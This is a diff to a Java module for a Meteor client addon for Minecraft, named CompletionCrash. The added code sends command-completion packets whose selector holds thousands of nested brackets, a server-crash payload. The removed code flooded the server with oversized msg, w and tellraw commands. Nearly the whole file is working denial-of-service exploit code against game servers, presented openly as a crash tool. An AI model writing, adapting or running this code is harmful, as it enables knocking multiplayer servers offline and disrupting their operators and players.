@@ -1,90 +1,52 @@
 package com.example.addon.modules;
 
-import meteordevelopment.meteorclient.events.game.GameLeftEvent;
 import meteordevelopment.meteorclient.events.world.TickEvent;
-import meteordevelopment.meteorclient.settings.*;
+import meteordevelopment.meteorclient.settings.IntSetting;
+import meteordevelopment.meteorclient.settings.Setting;
+import meteordevelopment.meteorclient.settings.SettingGroup;
 import meteordevelopment.meteorclient.systems.modules.Module;
 import meteordevelopment.orbit.EventHandler;
 import net.minecraft.client.MinecraftClient;
-import net.minecraft.network.packet.c2s.play.CommandExecutionC2SPacket;
 import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
-import com.example.addon.AddonTemplate;
-import net.minecraft.text.Text;
+import widecat.meteorcrashaddon.CrashAddon;
 
-import java.util.List;
-import java.util.Random;
 import java.util.stream.Collectors;
 import java.util.stream.IntStream;
 
-public class COMPLETIONCRASH extends Module {
-    private static final String CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+public class CompletionCrash extends Module {
     private final SettingGroup sgGeneral = settings.createGroup("Rate");
 
-    public COMPLETIONCRASH() {
-        super(AddonTemplate.CATEGORY, "CompletionCrash", "Only Working No Spam Limit Server!!!!!!!");
+    public CompletionCrash() {
+        super(CrashAddon.CATEGORY, "CompletionCrash", "Funny Completion");
     }
 
-    private int length = 2032; // 이게 좋은 코드
+    private int length = 2032;
 
     private final Setting<Integer> packets = sgGeneral.add(new IntSetting.Builder()
         .name("Packets per tick")
         .description("Amount of packets sent each tick")
-        .defaultValue(20)
+        .defaultValue(3)
         .min(2)
-        .sliderMax(400)
+        .sliderMax(12)
         .build()
     );
-    private final Setting<Modes> payloads = sgGeneral.add(new EnumSetting.Builder<Modes>()
-        .name("mode")
-        .description("Which Crash mode to use.")
-        .defaultValue(Modes.MSG)
-        .build()
-    );
-    public enum Modes {
-        MSG,
-        W,
-        TELLRAW
-    }
 
     @EventHandler
     private void onTick(TickEvent.Post event) {
-        switch (payloads.get()) {
-            case MSG -> {
-                String overflow = generateJsonObject(length);
-                String message = "msg PAYLOAD PAYLOAD";
-                String partialCommand = message.replace("PAYLOAD", overflow);
-                for (int i = 0; i < packets.get(); i++) {
-                    MinecraftClient.getInstance().player.networkHandler.sendPacket(new CommandExecutionC2SPacket(partialCommand));
-                }
-            }
-            case W -> {
-                String overflow = generateJsonObject(length);
-                String message = "w PAYLOAD PAYLOAD";
-                String partialCommand = message.replace("PAYLOAD", overflow);
-                for (int i = 0; i < packets.get(); i++) {
-                    MinecraftClient.getInstance().player.networkHandler.sendPacket(new CommandExecutionC2SPacket(partialCommand));
-                }
-            }
-            case TELLRAW -> {
-                String overflow = generateJsonObject(length);
-                String message = "tellraw PAYLOAD \"PAYLOAD\"";
-                String partialCommand = message.replace("PAYLOAD", overflow);
-                for (int i = 0; i < packets.get(); i++) {
-                    MinecraftClient.getInstance().player.networkHandler.sendPacket(new CommandExecutionC2SPacket(partialCommand));
-                }
-            }
+
+        String overflow = generateJsonObject(length);
+        String message = "msg @a[nbt={PAYLOAD}]";
+        String partialCommand = message.replace("{PAYLOAD}", overflow);
+        for (int i = 0; i < packets.get(); i++) {
+            MinecraftClient.getInstance().player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, partialCommand));
         }
+        this.toggle();
     }
 
-    private static String generateJsonObject(int levels) {
-        Random random = new Random();
+    private String generateJsonObject(int levels) {
         String in = IntStream.range(0, levels)
-            .mapToObj(i -> String.valueOf(CHARS.charAt(random.nextInt(CHARS.length()))))
+            .mapToObj(i -> "[")
             .collect(Collectors.joining());
-        return in;
-    }
-    @EventHandler
-    private void onWorldChange(GameLeftEvent event) {
-        if (this.isActive()) if (this.isActive()) this.toggle();
+        return "{a:" + in + "}";
     }
 }
